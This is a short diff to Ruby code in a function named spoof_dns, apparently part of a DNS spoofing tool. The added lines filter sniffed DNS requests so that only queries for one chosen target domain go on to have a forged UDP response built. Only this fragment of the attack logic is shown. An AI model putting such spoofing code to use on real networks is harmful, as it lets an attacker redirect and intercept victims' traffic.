@@ -86,6 +86,12 @@ def spoof_dns
                 @domain = getDomain(pkt.payload[12..-1])
                 puts "DNS Request for " + @domain
                 
+                #Match sniffed domain
+                if @domain != @sniffDomain
+                    next
+                end
+                puts "Matched target domain " + @sniffDomain
+                
                 #create query response (raw packets)
                 udp_pkt = UDPPacket.new(:config => @clientInfo)
                 udp_pkt.udp_src     = pkt.udp_dst
